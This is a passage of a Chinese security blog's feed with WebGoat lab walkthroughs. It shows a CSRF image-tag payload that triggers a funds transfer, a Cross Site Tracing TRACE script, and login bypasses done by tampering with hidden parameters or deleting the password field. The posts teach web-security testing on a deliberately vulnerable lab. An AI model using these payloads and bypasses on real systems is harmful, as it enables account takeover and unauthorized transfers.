class=&quot;string&quot;&gt;&quot;http://localhost/WebGoat/attack?Screen=175&amp;amp;menu=900&amp;amp;Num=18&amp;amp;transferFunds=5000&quot;&lt;/span&gt; width=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; height=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;被攻击者点开消息的时候，却找不到transferFunds参数了，提交的请求如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;修改该请求，在参数后面加“&amp;amp;transferFunds=4000”，攻击成功了。&lt;/p&gt;
&lt;h2 id=&quot;HTTPOnly-Text&quot;&gt;&lt;a href=&quot;#HTTPOnly-Text&quot; class=&quot;headerlink&quot; title=&quot;HTTPOnly Text&quot;&gt;&lt;/a&gt;HTTPOnly Text&lt;/h2&gt;&lt;p&gt;HTTPOnly是为了防止跨站脚本攻击的，一般跨站脚本攻击是为了偷cookie，而HTTPOnly是微软为cookie增加的一个属性值。如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，也无法改写cookie信息。这节课程就是用来熟悉HTTPOnly的。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;一共提供了这两个cookie，前者立了HttpOnly的标签，后者没有。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/3.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;分别选择是否打开HTTPOnly属性，在打开和不打开HTTPOnly属性的情况下，分别选择读这两个cookie和改写这两个cookie。&lt;br&gt;可以看到，在没开HTTPOnly属性的时候，这两个cookie均可以被读取和被改写。开了HTTPOnly的时候，前一个cookie就不能被读取和被改写了。&lt;/p&gt;
&lt;h2 id=&quot;Cross-Site-Tracing-Attacks&quot;&gt;&lt;a href=&quot;#Cross-Site-Tracing-Attacks&quot; class=&quot;headerlink&quot; title=&quot;Cross Site Tracing Attacks&quot;&gt;&lt;/a&gt;Cross Site Tracing Attacks&lt;/h2&gt;&lt;p&gt;这节讲跨站跟踪攻击。HTTP方法包括：HEAD、GET、POST、TRACE、PUT、DELETE等。tomact支持HTTP TRACE命令。&lt;br&gt;XST攻击描述：攻击者将恶意代码嵌入一台已经被控制的主机上的web文件，当访问者浏览时恶意代码在浏览器中执行，然后访问者的cookie、http基本验证以及html验证信息将被发送到已经被控制的主机，同时传送Trace请求给目标主机，导致cookie欺骗或者是中间人攻击。&lt;br&gt;XST攻击条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要目标web服务器允许Trace参数；&lt;/li&gt;
&lt;li&gt;需要一个用来插入XST代码的地方； &lt;/li&gt;
&lt;li&gt;目标站点存在跨域漏洞。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;这是一个购物车页面。在最后一栏，enter your three digit access code那里添加如下代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( navigator.appName.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;Microsoft&quot;&lt;/span&gt;) !=&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xmlHttp = newActiveXObject(&lt;span class=&quot;string&quot;&gt;&quot;Microsoft.XMLHTTP&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	xmlHttp.open(&lt;span class=&quot;string&quot;&gt;&quot;TRACE&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;./&quot;&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	xmlHttp.send();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	str1=xmlHttp.responseText; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (str1.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;) &amp;gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) str1 = str1.replace(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.write(str1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;提交后攻击成功。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;防止这些攻击的方法就是对用户输入进行验证，过滤或者转义掉一些关键字符。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/04/Webgoat之XSS/&quot;&gt;http://qimingyu.github.io/2016/05/04/Webgoat之XSS/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Phishing-with-XSS&quot;&gt;&lt;a href=&quot;#Phishing-with-XSS&quot; class=&quot;headerlink&quot; title=&quot;Phishing with XSS&quot;&gt;&lt;/a&gt;Phishing with XSS&lt;/h2&gt;&lt;p&gt;如下所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;这是一个标准的输入搜索框，点击搜索之后，会在下方分别呈现要求和搜索结果。&lt;br&gt;要求注入html和js代码，搜集证书，并把其发送给一个网站。&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="XSS" scheme="http://qimingyu.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之Authentication Flaws</title>
    <link href="http://qimingyu.github.io/2016/05/03/Webgoat%E4%B9%8BAuthentication_Flaws/"/>
    <id>http://qimingyu.github.io/2016/05/03/Webgoat之Authentication_Flaws/</id>
    <published>2016-05-03T13:15:52.000Z</published>
    <updated>2016-05-04T06:25:52.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Password-Strength&quot;&gt;&lt;a href=&quot;#Password-Strength&quot; class=&quot;headerlink&quot; title=&quot;Password Strength&quot;&gt;&lt;/a&gt;Password Strength&lt;/h2&gt;&lt;p&gt;这一节主要是讲密码强度的，一个好的密码应该由大写字母，小写字母，数字组成。需要我们把密码都拿到&lt;a href=&quot;https://www.cnlab.ch/codecheck&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;去测试，然后给出测试结果即可。&lt;br&gt;由于这个网站关闭了，找到了&lt;a href=&quot;https://howsecureismypassword.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;用于测试密码强度。该课程设定如下结果会通过：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Forget-Password&quot;&gt;&lt;a href=&quot;#Forget-Password&quot; class=&quot;headerlink&quot; title=&quot;Forget Password&quot;&gt;&lt;/a&gt;Forget Password&lt;/h2&gt;&lt;p&gt;这一节是关于找回密码功能的。密码找回功能设置过于简单时，别人可以猜对答案。本节课程要求找回用户名为admin的密码，需要回答正确最喜欢的颜色是什么，猜测green是对的，通过。&lt;/p&gt;
&lt;h2 id=&quot;Basic-Authentication&quot;&gt;&lt;a href=&quot;#Basic-Authentication&quot; class=&quot;headerlink&quot; title=&quot;Basic Authentication&quot;&gt;&lt;/a&gt;Basic Authentication&lt;/h2&gt;&lt;p&gt;关于HTTP的基本认证，&lt;a href=&quot;http://blog.csdn.net/kiwi_coder/article/details/28677651&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;讲的比较详细了。这一节讲基本的身份验证，基本的身份验证是用来保护服务器端资源的，当客户端向服务器请求一个URL，如果服务器这个资源需要身份认证的话，服务器将发送401认证请求与所请求的资源响应。例如，以我们登陆WebGoat的过程为例。&lt;br&gt;这是客户端传过去的请求：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;这是服务端的响应：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;页面显示如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后输入用户名和密码提交，发送请求如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;可见在请求头部增加了一个认证字段，这个认证字段的内容是浏览器将刚刚输入的用户名和密码使用Base64编码方式进行编码，并将这些凭据发送给Web服务器。Web服务器会验证这些凭据，如果凭据正确，则返回所请求的资源。&lt;br&gt;服务器传过来的回应如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;它给浏览器传了一个set-cookie字段，这个set-cookie是一个JSESSIONID，以后浏览器给服务器传东西都要用这个cookie进行身份的认证。&lt;/p&gt;
&lt;h3 id=&quot;Stage-1&quot;&gt;&lt;a href=&quot;#Stage-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;第一阶段是需要我们输入认证信息的头和认证信息解密后的内容：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;我们以上一节Forgot Password为例：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/8.png&quot; alt=&quot;8&quot;&gt;&lt;/p&gt;
&lt;p&gt;输入用户名后点击提交，下面是burpsuit拦截到的请求：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;注意cookie和Authentication两个字段，可以看到cookie就是之前登陆的时候服务传给我们的set-cookie，而认证字段里面的值，经过Base64解密之后为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/10.png&quot; alt=&quot;10&quot;&gt;&lt;/p&gt;
&lt;p&gt;因此在课程页面输入“Authorization”，“guest:guest”，提交后通过。&lt;/p&gt;
&lt;h3 id=&quot;Stage-2&quot;&gt;&lt;a href=&quot;#Stage-2&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;这一部分是让我们明白cookie是如何用来进行会话管理的，同时基本认证头是如何用来进行认证的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果客户端传给服务器的请求头中Authorization字段是正确的，cookie也是正确的，没有影响，服务器会定位到当前工作页面。&lt;/li&gt;
&lt;li&gt;如果客户端传给服务器的请求头中Authorization字段是正确的，而cookie是不正确的，服务器会给客户端传一个新的set-cookie，并且定位到Webgoat开始的地方，历史记录会存在。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上两点可以看出，cookie影响的是客户端和服务器端的会话。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果客户端传给服务器的请求头中没有Authorization字段，而cookie是正确的，没有影响。&lt;/li&gt;
&lt;li&gt;如果客户端传给服务器的请求头中没有Authorization字段，而cookie是错误的或者没有，服务会需要重新输入用户名和密码进行验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上两点看出，服务器先验证cookie，再看Authorization字段。&lt;/p&gt;
&lt;p&gt;同时删除Authorization和cookie，服务器会要求输入新的用户名和密码。&lt;br&gt;而此时认证提交给服务器的数据：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户名和密码是另一个用户的，如果cookie与之前相同，那么就是新用户老会话&lt;/li&gt;
&lt;li&gt;用户名和密码是另一个用户的，如果cookie与之前不同，那么就是新用户新会话&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当达到后一点时，该课程就通过了。&lt;/p&gt;
&lt;p&gt;也就是首先修改提交数据，同时删除Authorization和cookie，强迫让服务器进行重新验证。而重新验证的时候一般发送时会带有原来会话的cookie，在提交的时候删除该cookie即可成功。这时对服务器而言就是一个新的用户和新的会话，可以看到原来通过的课程都没有标记了。再次点击这一关，显示通过了。&lt;/p&gt;
&lt;h2 id=&quot;Multi-Level-Login-1&quot;&gt;&lt;a href=&quot;#Multi-Level-Login-1&quot; class=&quot;headerlink&quot; title=&quot;Multi Level Login 1&quot;&gt;&lt;/a&gt;Multi Level Login 1&lt;/h2&gt;&lt;p&gt;这是一个多级登陆，对于多级登陆的系统，往往会要求首先输入用户名和密码，进入之后，会要求再输入一个什么密码，而这个密码有点像密保卡一样，密保卡只有用户本人拥有，系统随机要求输入第几行第几列的数字组合，用户照着密保卡上面的数字按照系统提示的规则输入进去就行了。这个多级登陆的方式在原来的《大话西游》网游中曾经用过。&lt;/p&gt;
&lt;h3 id=&quot;Stage-1-1&quot;&gt;&lt;a href=&quot;#Stage-1-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;这部分是要求我们了解多级登陆的流程，按照要求输入即可通过。&lt;/p&gt;
&lt;h3 id=&quot;Stage-2-1&quot;&gt;&lt;a href=&quot;#Stage-2-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;现在一名黑客已经拿到了某个人的用户名和密码，以及他的第一个业务码，但其他的业务码不知道。而问题在于第一个业务码会经常被用到，黑客如果照他的用户名和密码进行登录之后进行操作的话，系统会要求其输入其他的业务码，如何解决该问题？&lt;br&gt;进去之后，依然提交第一个业务码，然后抓包之后修改提交参数，把hidden_tan的值由2改为1即可。&lt;/p&gt;
&lt;h2 id=&quot;Multi-Level-login-2&quot;&gt;&lt;a href=&quot;#Multi-Level-login-2&quot; class=&quot;headerlink&quot; title=&quot;Multi Level login 2&quot;&gt;&lt;/a&gt;Multi Level login 2&lt;/h2&gt;&lt;p&gt;我是WebGoat财务系统中正常的一名客户Joe，我拥有我应该有的所有密码。现在要求利用多级登陆的漏洞，在仅仅知道Jane的名字的情况下，我要以Jane的身份登陆进去。&lt;br&gt;同样在提交业务码的时候，抓包之后修改隐藏的提交参数，把hidden_user的值由Joe改为Jane即可。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;有时候安全系统越复杂，往往看起来更安全，但实际上可能隐藏的漏洞也更多。简单而高效才是真正的牛逼。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/03/Webgoat之Authentication_Flaws/&quot;&gt;http://qimingyu.github.io/2016/05/03/Webgoat之Authentication_Flaws/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Password-Strength&quot;&gt;&lt;a href=&quot;#Password-Strength&quot; class=&quot;headerlink&quot; title=&quot;Password Strength&quot;&gt;&lt;/a&gt;Password Strength&lt;/h2&gt;&lt;p&gt;这一节主要是讲密码强度的，一个好的密码应该由大写字母，小写字母，数字组成。需要我们把密码都拿到&lt;a href=&quot;https://www.cnlab.ch/codecheck&quot;&gt;这个网站&lt;/a&gt;去测试，然后给出测试结果即可。&lt;br&gt;由于这个网站关闭了，找到了&lt;a href=&quot;https://howsecureismypassword.net/&quot;&gt;这个网站&lt;/a&gt;用于测试密码强度。该课程设定如下结果会通过：&lt;br&gt;&lt;img src=&quot;/images/webgoat_authentication_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="认证安全" scheme="http://qimingyu.github.io/tags/%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Improper Error Handing</title>
    <link href="http://qimingyu.github.io/2016/04/29/Webgoat%E4%B9%8BImproper_Error_Handing/"/>
    <id>http://qimingyu.github.io/2016/04/29/Webgoat之Improper_Error_Handing/</id>
    <published>2016-04-29T06:54:06.000Z</published>
    <updated>2016-04-29T08:23:03.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Fail-Open-Authentication-Scheme&quot;&gt;&lt;a href=&quot;#Fail-Open-Authentication-Scheme&quot; class=&quot;headerlink&quot; title=&quot;Fail Open Authentication Scheme&quot;&gt;&lt;/a&gt;Fail Open Authentication Scheme&lt;/h2&gt;&lt;p&gt;这节讲不当的错误处理。打开认证失败。Java代码中异常处理部分为成功认证行为进行异常捕获。该异常产生是因为密码字段使用了空指针。&lt;/p&gt;
&lt;p&gt;打开是这样的页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_improper_error_handing/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;它要求我们输入用户名密码登陆，其中用户名是“webgoat”，他已经给我们了，重要的是猜对他的密码。&lt;/p&gt;
&lt;p&gt;我们可以浏览器打开代理之后，用burpsuit抓到请求之后，直接删除password字段，提交给服务器，这时服务器会报错，因为password是空指针，进入错误处理流程，由于它处理不当，我们就可以登录了。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;这又是一个绕过登录的方法。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/29/Webgoat之Improper_Error_Handing/&quot;&gt;http://qimingyu.github.io/2016/04/29/Webgoat之Improper_Error_Handing/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Fail-Open-Authentication-Scheme&quot;&gt;&lt;a href=&quot;#Fail-Open-Authentication-Scheme&quot; class=&quot;headerlink&quot; title=&quot;Fail Open Authentication Scheme&quot;&gt;&lt;/a&gt;Fail Open Authentication Scheme&lt;/h2&gt;&lt;p&gt;这节讲不当的错误处理。打开认证失败。Java代码中异常处理部分为成功认证行为进行异常捕获。该异常产生是因为密码字段使用了空指针。&lt;/p&gt;
&lt;p&gt;打开是这样的页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_improper_error_handing/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="错误处理" scheme="http://qimingyu.github.io/tags/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Insecure Communication</title>
    <link href="http://qimingyu.github.io/2016/04/27/Webgoat%E4%B9%8BInsecure_Communication/"/>
    <id>http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Communication/</id>
    <published>2016-04-27T02:08:15.000Z</published>
    <updated>2016-04-29T05:23:39.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Insecure-Login&quot;&gt;&lt;a href=&quot;#Insecure-Login&quot; class=&quot;headerlink&quot; title=&quot;Insecure Login&quot;&gt;&lt;/a&gt;Insecure Login&lt;/h2&gt;&lt;p&gt;该课程第一步需要抓取HTTP传送时的密码，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_insecure_communication/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;该过程直接用burpsuit抓取即可。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第二步要转换为HTTPS服务，再抓取。&lt;/p&gt;
&lt;p&gt;这里有几个问题就需要说明了：&lt;/p&gt;
&lt;h3 id=&quot;关于HTTPS&quot;&gt;&lt;a href=&quot;#关于HTTPS&quot; class=&quot;headerlink&quot; title=&quot;关于HTTPS&quot;&gt;&lt;/a&gt;关于HTTPS&lt;/h3&gt;&lt;p&gt;HTTP是我们平时用于浏览网页时客户端和服务器之间传输数据的一种传输协议，但是HTTP传输的数据都是未加密的，因此如果使用HTTP协议传输隐私信息的话，是不安全的。为了保证隐私数据，我们需要对正常数据进行加密，因此就有了SSL协议用于对HTTP协议传输的数据进行加密，于是诞生了HTTPS。而后面的TLS协议是SSL协议的升级版，我们现在使用的HTTPS实际上都是用的TLS协议。&lt;br&gt;HTTP的过程就是请求—响应的过程。而HTTPS要复杂一点，它需要同时验证客户端浏览器和网站端服务器。详细过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;浏览器将自己支持的一套加密规则发送给网站服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;网站服务器从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。（网站需要向浏览器证明自己的身份）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;获得网站证书之后浏览器要做以下工作：&lt;/p&gt;
&lt;p&gt; a) 验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。&lt;/p&gt;
&lt;p&gt; b) 如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。&lt;/p&gt;
&lt;p&gt; c) 使用约定好的HASH计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;网站接收浏览器发来的数据之后要做以下的操作：&lt;/p&gt;
&lt;p&gt; a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。&lt;/p&gt;
&lt;p&gt; b) 使用密码加密一段握手消息，发送给浏览器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里浏览器与网站互相发送加密的握手消息并验证，目的是为了保证双方都获得了一致的密码，并且可以正常的加密解密数据，为后续真正数据的传输做一次测试。另外，HTTPS一般使用的加密与HASH算法如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非对称加密算法：RSA，DSA/DSS&lt;/li&gt;
&lt;li&gt;对称加密算法：AES，RC4，3DES&lt;/li&gt;
&lt;li&gt;HASH算法：MD5，SHA1，SHA256&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中非对称加密算法用于在握手过程中加密生成的密码，对称加密算法用于对真正传输的数据进行加密，而HASH算法用于验证数据的完整性。由于浏览器生成的密码是整个数据加密的关键，因此在传输的时候使用了非对称加密算法对其加密。非对称加密算法会生成公钥和私钥，公钥只能用于加密数据，因此可以随意传输，而网站的私钥用于对数据进行解密，所以网站都会非常小心的保管自己的私钥，防止泄漏。&lt;/p&gt;
&lt;p&gt;TLS握手过程中如果有任何错误，都会使加密连接断开，从而阻止了隐私信息的传输。&lt;/p&gt;
&lt;h3 id=&quot;如何用burpsuit抓取HTTPS&quot;&gt;&lt;a href=&quot;#如何用burpsuit抓取HTTPS&quot; class=&quot;headerlink&quot; title=&quot;如何用burpsuit抓取HTTPS&quot;&gt;&lt;/a&gt;如何用burpsuit抓取HTTPS&lt;/h3&gt;&lt;p&gt;以上过程解释了为何不配置的话，用burpsuit是抓取不到HTTPS的。因为burpsuit相当于是在浏览器和服务器之间的中间人，数据都是经过它来做中间转发的，对于HTTPS协议而言，它是需要同时验证浏览器和服务器的，而浏览器传输数据的第一站是burpsuit，如果不在浏览器中添加hurpsuit的证书，浏览器不会信任它，所以与它之间的连接就建立不起来了。&lt;/p&gt;
